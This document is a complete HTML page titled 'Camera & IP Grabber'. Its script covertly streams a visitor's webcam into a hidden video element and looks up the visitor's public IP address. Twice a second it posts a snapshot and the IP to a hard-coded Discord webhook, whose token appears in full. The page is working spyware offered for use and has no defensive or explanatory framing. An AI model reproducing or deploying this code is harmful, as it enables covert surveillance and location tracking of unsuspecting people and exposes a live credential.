<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Camera & IP Grabber</title>
</head>
<body>
<video id="video" autoplay playsinline style="display:none;"></video>
<script>
const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA";

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch {
    return "unknown";
  }
}

async function captureAndSend() {
  const video = document.getElementById('video');
  if (!video.srcObject) return;

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const imgData = canvas.toDataURL('image/png');

  const ip = await getIP();

  const payload = {
    content: `IP: ${ip}`,
    embeds: [{
      image: { url: imgData }
    }]
  };

  fetch(webhook, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(payload)
  });
}

async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('video');
    video.srcObject = stream;
    video.play();

    setInterval(captureAndSend, 500);
  } catch (e) {
    console.error('Camera access denied or error:', e);
  }
}

start();
</script>
